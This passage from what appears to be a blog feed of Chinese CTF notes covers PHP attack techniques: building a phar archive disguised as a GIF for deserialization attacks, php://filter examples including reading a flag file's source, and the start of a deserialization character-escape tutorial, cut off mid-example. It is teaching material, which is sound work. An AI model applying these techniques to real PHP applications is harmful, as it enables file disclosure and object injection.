class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>这样就伪装成GIF了</p><p><img src="https://s2.loli.net/2023/03/23/OHBxsjf3ypkAie5.png" alt="image-20230323150245356"></p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote><p>phar文件需要上传到服务器端<br>要有可用的魔术方法作为“跳板”<br>文件操作函数的参数可控，且:  <code>/、phar</code>等特殊字符没有被过滤</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/6753#toc-13">https://xz.aliyun.com/t/6753#toc-13</a></p><p><a href="https://www.freebuf.com/articles/web/305292.html">https://www.freebuf.com/articles/web/305292.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phar反序列化总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/08/24/php%20filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/08/24/php%20filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="php-filter伪协议总结"><a href="#php-filter伪协议总结" class="headerlink" title="php:&#x2F;&#x2F;filter伪协议总结"></a>php:&#x2F;&#x2F;filter伪协议总结</h2><h3 id="php-filter伪协议介绍"><a href="#php-filter伪协议介绍" class="headerlink" title="php:&#x2F;&#x2F;filter伪协议介绍"></a>php:&#x2F;&#x2F;filter伪协议介绍</h3><p><code>php://filter</code>是<code>php</code>中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如<code>base64</code>编码处理，<code>rot13</code>处理等。官方解释为：</p><blockquote><p>php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 </p></blockquote><p><code>php://filter</code>伪协议可以用于如下函数：</p><blockquote><p>include()</p><p>file()</p><p>file_get_contents()</p><p>readfile()</p><p>file_put_contents()</p><p>可以用于读取、写入文件等函数，</p></blockquote><h3 id="php-filter伪协议使用方法"><a href="#php-filter伪协议使用方法" class="headerlink" title="php:&#x2F;&#x2F;filter伪协议使用方法"></a>php:&#x2F;&#x2F;filter伪协议使用方法</h3><p><code>php://filter伪协议</code>的一般使用方法为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/过滤器|过滤器/resource=要过滤的数据流</span><br></code></pre></td></tr></table></figure><p>过滤器可以设置多个，使用管道符 <code>|</code>分隔，按照从左到右的方式依次使用相应的过滤器进行过滤处理，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/read=convert.base64-encode|convert.base64-encode/resource=data://text/plain,&lt;?php phpinfo();?&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><p>上述代码对 <code>&lt;?php phpinfo();?&gt;</code> 进行了两次base64编码处理。</p><p>read可以省略，会自动根据函数作用来决定read还是write。</p><p>我们使用了 <code>data伪协议</code> 将 <code>file_get_contents()</code> 想要读取的内容变成了data伪协议输入的内容。</p><h3 id="php-filter过滤器分类"><a href="#php-filter过滤器分类" class="headerlink" title="php:&#x2F;&#x2F;filter过滤器分类"></a>php:&#x2F;&#x2F;filter过滤器分类</h3><p>根据 <a href="https://www.php.net/manual/zh/filters.php">php:&#x2F;&#x2F;filter官方说明 </a> ，<code>php://filter协议</code>的<strong>过滤器</strong> <strong>大致分为以下四类：</strong></p><p>1、字符串过滤器</p><p>2、转换过滤器</p><p>3、压缩过滤器</p><p>4、加密过滤器</p><h3 id="filter字符串过滤器"><a href="#filter字符串过滤器" class="headerlink" title="filter字符串过滤器"></a>filter字符串过滤器</h3><blockquote><p>每个过滤器都正如其名字暗示的那样工作并与内置的 PHP 字符串函数的行为相对应。</p></blockquote><p>字符串过滤器以 <code>string</code> 开头，常见的过滤器有 <code>rot13</code>、<code>toupper</code>、<code>tolower</code>、<code>strip_tags</code>等</p><h4 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h4><p>使用该过滤器也就是用 <a href="https://www.php.net/manual/zh/function.str-rot13.php">str_rot13()</a> 函数处理所有的流数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/read=string.rot13/resource=data://text/plain,abcdefg&quot;</span>);<br><span class="hljs-comment">//输出： nopqrst</span><br></code></pre></td></tr></table></figure><h4 id="string-toupper"><a href="#string-toupper" class="headerlink" title="string.toupper"></a>string.toupper</h4><h4 id="string-tolower"><a href="#string-tolower" class="headerlink" title="string.tolower"></a>string.tolower</h4><p>该过滤器就是将字符串进行大小写转换.</p><p>等同于<code>strtolower()</code>、<code>strtoupper()</code> 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/read=string.toupper/resource=data://text/plain,abcdefg&quot;</span>);<br><span class="hljs-comment">//输出 ABCDEFG</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/read=string.tolower/resource=data://text/plain,ABCDEFG&quot;</span>);<br><span class="hljs-comment">//输出 abcdefg</span><br></code></pre></td></tr></table></figure><h4 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h4><blockquote><p>本特性已自 PHP 7.3.0 起<em>废弃</em>。强烈建议不要使用本特性。</p></blockquote><p>使用此过滤器等同于用     <a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a> 函数处理所有的流数据。可以用两种格式接收参数：一种是和     <a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a> 函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。   </p><blockquote><p><strong>strip_tags()</strong> — 从字符串中去除 HTML 和 PHP 标签</p></blockquote><p><code>strip_tags</code>对数据流进行<code>strip_tags</code>函数的处理，该函数功能为剥去字符串中的 <code>HTML</code>、<code>XML</code> 以及 <code>PHP</code> 的标签，简单理解就是包含有尖括号中的东西。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/string.strip_tags/resource=flag.php&quot;</span>);<br><br><span class="hljs-comment">//flag.php</span><br>&lt;b&gt;flag&#123;abc&#125;&lt;/b&gt;<br>    <br><span class="hljs-comment">//输出：flag&#123;abc&#125;</span><br></code></pre></td></tr></table></figure><h3 id="filter转换过滤器"><a href="#filter转换过滤器" class="headerlink" title="filter转换过滤器"></a>filter转换过滤器</h3><p>主要含有三类，分别是<code>base64</code>的编码转换、<code>quoted-printable</code>的编码转换以及<code>iconv</code>字符编码的转换。该类过滤器以<code>convert</code>（转换）开头。</p><h4 id="convert-base64-encode"><a href="#convert-base64-encode" class="headerlink" title="convert.base64-encode"></a>convert.base64-encode</h4><h4 id="convert-base64-decode"><a href="#convert-base64-decode" class="headerlink" title="convert.base64-decode"></a>convert.base64-decode</h4><p>将数据进行base64编码、解码</p><blockquote><p>使用这两个过滤器等同于分别用    <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a> 和     <a href="https://www.php.net/manual/zh/function.base64-decode.php">base64_decode()</a>    函数处理所有的流数据。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=data://text/plain,abc&quot;</span>);<br><span class="hljs-comment">//输出：YWJj    abc的base64编码</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/read=convert.base64-decode/resource=data://text/plain,YWJj&quot;</span>);<br><span class="hljs-comment">//输出：abc</span><br></code></pre></td></tr></table></figure><h4 id="convert-quoted-printable-encode"><a href="#convert-quoted-printable-encode" class="headerlink" title="convert.quoted-printable-encode"></a>convert.quoted-printable-encode</h4><h4 id="convert-quoted-printable-decode"><a href="#convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-decode"></a>convert.quoted-printable-decode</h4><blockquote><p>使用此过滤器的 decode 版本等同于用 <a href="https://www.php.net/manual/zh/function.quoted-printable-decode.php">quoted_printable_decode()</a>    函数处理所有的流数据。没有和 <code>convert.quoted-printable-encode</code>     相对应的函数。</p></blockquote><p><code>quoted-printable-encode</code>可译为<strong>可打印字符引用编码</strong>，可以理解为将一些不可打印的<code>ASCII</code>字符进行一个编码转换，转换成：<code>=</code>后面跟两个十六进制数，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.quoted-printable-encode/resource=data://text/plain,666&quot;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">12</span>));<br><span class="hljs-comment">//输出：666=0C</span><br><br><span class="hljs-comment">//将ascii码为12的字符编码为：=0C</span><br></code></pre></td></tr></table></figure><p><code>quoted-printable-decode</code> 与上述操作相反，将<code> =后面跟上两个16进制数</code> 转换为不可打印的ascii字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.quoted-printable-decode/resource=data://text/plain,666=0A888&quot;</span>);<br><br>输出：<span class="hljs-number">666</span>      <span class="hljs-comment">// =0A 是 \n 的编码</span><br><span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><blockquote><p>在激活 <a href="https://www.php.net/manual/zh/book.iconv.php">iconv</a>     的前提下可以使用 <code>convert.iconv.*</code> 压缩过滤器，  等同于用 <a href="https://www.php.net/manual/zh/function.iconv.php">iconv()</a> 处理所有的流数据。      </p></blockquote><p><code>iconv</code>过滤器 就是对输入输出的数据进行编码转换，即将输入的字符串编码转换成输出指定的编码</p><p>写法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">该过滤器不支持参数，但可使用输入/输出的编码名称，组成过滤器名称，比如 :    <br>    <br>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; <br>    或<br>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;  （两种写法的语义都相同）。    <br></code></pre></td></tr></table></figure><p><code>&lt;input-encoding&gt;和&lt;output-encoding&gt;</code> 就是编码方式，有如下几种;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">UCS-<span class="hljs-number">4</span>*<br>UCS-<span class="hljs-number">4</span>BE<br>UCS-<span class="hljs-number">4</span>LE*<br>UCS-<span class="hljs-number">2</span><br>UCS-<span class="hljs-number">2</span>BE<br>UCS-<span class="hljs-number">2</span>LE<br>UTF-<span class="hljs-number">32</span>*<br>UTF-<span class="hljs-number">32</span>BE*<br>UTF-<span class="hljs-number">32</span>LE*<br>UTF-<span class="hljs-number">16</span>*<br>UTF-<span class="hljs-number">16</span>BE*<br>UTF-<span class="hljs-number">16</span>LE*<br>UTF-<span class="hljs-number">7</span><br>UTF7-IMAP<br>UTF-<span class="hljs-number">8</span>*<br>ASCII*<br></code></pre></td></tr></table></figure><p>例如：</p><p>将 <code>abcdefg</code>  从编码 <code>UCS-2LE</code> 转换为 <code>UCS-2BE</code> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=data://text/plain,abcdefg&quot;</span>);<br><span class="hljs-comment">//输出： badcfe</span><br></code></pre></td></tr></table></figure><p>就是两两字符顺序互换一下（两个两个一组）如果不是字符串2的倍数，最后1个字符不会被输出</p><p>将 <code>abcdefgh1234</code> 从编码 <code>UCS-4LE</code> 转换为 <code>UCS-4BE</code> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=data://text/plain,abcdefgh1234&quot;</span>);<br><span class="hljs-comment">//输出：dcbahgfe4321</span><br></code></pre></td></tr></table></figure><p>（四个一组）将每一组内的成员倒序排列，如果不是字符串4的倍数，最后几个字符不会被输出</p><h3 id="filter压缩过滤器"><a href="#filter压缩过滤器" class="headerlink" title="filter压缩过滤器"></a>filter压缩过滤器</h3><blockquote><p>虽然 <a href="https://www.php.net/manual/zh/wrappers.compression.php">压缩封装协议</a> 提供了在本地文件系统中     创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，     也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。    </p></blockquote><h4 id="zlib-deflate（压缩）"><a href="#zlib-deflate（压缩）" class="headerlink" title="zlib.deflate（压缩）"></a>zlib.deflate（压缩）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;php://filter/read=zlib.deflate/resource=test.php&quot;</span>);<br><br><span class="hljs-comment">//test.php</span><br>abcdef<br></code></pre></td></tr></table></figure><p>输出：</p><img src="https://s2.loli.net/2023/01/07/ENhxL7iTaOzBF3p.png" alt="image-20230107171528799" style="zoom:33%;" /><h4 id="zlib-inflate（解压）"><a href="#zlib-inflate（解压）" class="headerlink" title="zlib.inflate（解压）"></a>zlib.inflate（解压）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;php://filter/read=zlib.inflate/resource=test.php&quot;</span>);<br><span class="hljs-comment">//test.php内容为上面压缩后的内容</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/01/07/SZUABzDIHP6xjKw.png" alt="image-20230107171630762" style="zoom:33%;" /><h4 id="bzip2-compress-压缩"><a href="#bzip2-compress-压缩" class="headerlink" title="bzip2.compress (压缩)"></a>bzip2.compress (压缩)</h4><h4 id="bzip2-decompress-解压"><a href="#bzip2-decompress-解压" class="headerlink" title="bzip2.decompress (解压)"></a>bzip2.decompress (解压)</h4><blockquote><p><code>bzip2.compress</code> 和     <code>bzip2.decompress</code> 工作的方式与上面讲的 <code>zlib</code> 过滤器相同</p></blockquote><h3 id="filter加密过滤器"><a href="#filter加密过滤器" class="headerlink" title="filter加密过滤器"></a>filter加密过滤器</h3><p>加密过滤器特别适用于文件&#x2F;数据流的加密。   </p><blockquote><p>本特性已自 PHP 7.1.0 起<em>废弃</em>。强烈建议不要使用本特性。</p></blockquote><h4 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt.*"></a>mcrypt.*</h4><h4 id="mdecrypt"><a href="#mdecrypt" class="headerlink" title="mdecrypt.*"></a>mdecrypt.*</h4><p><code>mcrypt.*</code> 和     <code>mdecrypt.*</code> 使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持    <a href="https://www.php.net/manual/zh/ref.mcrypt.php">mcrypt 扩展库</a>中相同的算法，格式为     <code>mcrypt.ciphername</code>，其中     <code>ciphername</code> 是密码的名字，将被传递给     <a href="https://www.php.net/manual/zh/function.mcrypt-module-open.php">mcrypt_module_open()</a>。有以下五个过滤器参数可用：    </p><p><strong>mcrypt 过滤器参数</strong></p><table><thead><tr><th>参数</th><th>是否必须</th><th>默认值</th><th>取值举例</th></tr></thead><tbody><tr><td>mode</td><td>可选</td><td>cbc</td><td>cbc, cfb, ecb, nofb, ofb, stream</td></tr><tr><td>algorithms_dir</td><td>可选</td><td>ini_get(‘mcrypt.algorithms_dir’)</td><td>algorithms 模块的目录</td></tr><tr><td>modes_dir</td><td>可选</td><td>ini_get(‘mcrypt.modes_dir’)</td><td>modes 模块的目录</td></tr><tr><td>iv</td><td>必须</td><td>N&#x2F;A</td><td>典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr><tr><td>key</td><td>必须</td><td>N&#x2F;A</td><td>典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr></tbody></table><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="php-filter-官方文档"><a href="#php-filter-官方文档" class="headerlink" title="php:&#x2F;&#x2F;filter 官方文档"></a><a href="https://www.php.net/manual/zh/filters.php">php:&#x2F;&#x2F;filter 官方文档</a></h3><h3 id="PHP-Filter伪协议Trick总结"><a href="#PHP-Filter伪协议Trick总结" class="headerlink" title="PHP Filter伪协议Trick总结"></a><a href="https://blog.csdn.net/gental_z/article/details/122303393#:~:text=php%3A%2F%2Ffilter%20%E6%98%AF%20php%20%E4%B8%AD%E7%8B%AC%E6%9C%89%E7%9A%84%E4%B8%80%E7%A7%8D%E5%8D%8F%E8%AE%AE%EF%BC%8C%E5%AE%83%E6%98%AF%E4%B8%80%E7%A7%8D%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%AD%E9%97%B4%E6%B5%81%E6%9D%A5%E8%BF%87%E6%BB%A4%E5%85%B6%E4%BB%96%E7%9A%84%E6%95%B0%E6%8D%AE%E6%B5%81%E3%80%82,%E9%80%9A%E5%B8%B8%E4%BD%BF%E7%94%A8%E8%AF%A5%E5%8D%8F%E8%AE%AE%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%88%96%E8%80%85%E5%86%99%E5%85%A5%E9%83%A8%E5%88%86%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%94%E5%9C%A8%E8%AF%BB%E5%8F%96%E5%92%8C%E5%86%99%E5%85%A5%E4%B9%8B%E5%89%8D%E5%AF%B9%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%BA%9B%E8%BF%87%E6%BB%A4%EF%BC%8C%E4%BE%8B%E5%A6%82%20base64%20%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86%EF%BC%8C%20rot13%20%E5%A4%84%E7%90%86%E7%AD%89%E3%80%82">PHP Filter伪协议Trick总结</a></h3><h3 id="php-filter的各种过滤器"><a href="#php-filter的各种过滤器" class="headerlink" title="php:&#x2F;&#x2F;filter的各种过滤器"></a><a href="https://blog.csdn.net/qq_44657899/article/details/109300335#:~:text=convert.iconv.%2A%20%E8%BF%99%E4%B8%AA%E8%BF%87%E6%BB%A4%E5%99%A8%E9%9C%80%E8%A6%81%20php%20%E6%94%AF%E6%8C%81%20iconv%EF%BC%8C%E8%80%8C,iconv%20%E6%98%AF%E9%BB%98%E8%AE%A4%E7%BC%96%E8%AF%91%E7%9A%84%E3%80%82%20%E4%BD%BF%E7%94%A8convert.iconv.%2A%E8%BF%87%E6%BB%A4%E5%99%A8%E7%AD%89%E5%90%8C%E4%BA%8E%E7%94%A8%20iconv%20%28%29%20%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86%E6%89%80%E6%9C%89%E7%9A%84%E6%B5%81%E6%95%B0%E6%8D%AE%E3%80%82">php:&#x2F;&#x2F;filter的各种过滤器</a></h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化字符逃逸</title>
    <link href="/2023/08/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
    <url>/2023/08/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h1><h3 id="php反序列化字符逃逸的原理"><a href="#php反序列化字符逃逸的原理" class="headerlink" title="php反序列化字符逃逸的原理"></a>php反序列化字符逃逸的原理</h3><p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</p><h3 id="php反序列化字符逃逸分类"><a href="#php反序列化字符逃逸分类" class="headerlink" title="php反序列化字符逃逸分类"></a>php反序列化字符逃逸分类</h3><blockquote><p>过滤后<strong>字符变多</strong></p><p>过滤后<strong>字符变少</strong></p></blockquote><h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><p>我们先定义一个类 <code>user</code> ,成员变量 <code>username</code>，<code>password</code>，<code>isVIP</code>，并且序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br><span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到，我们user类的对象默认 isVIP&#x3D;0，并且不受传入参数的影响</p><p>这时我们增加一个过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span 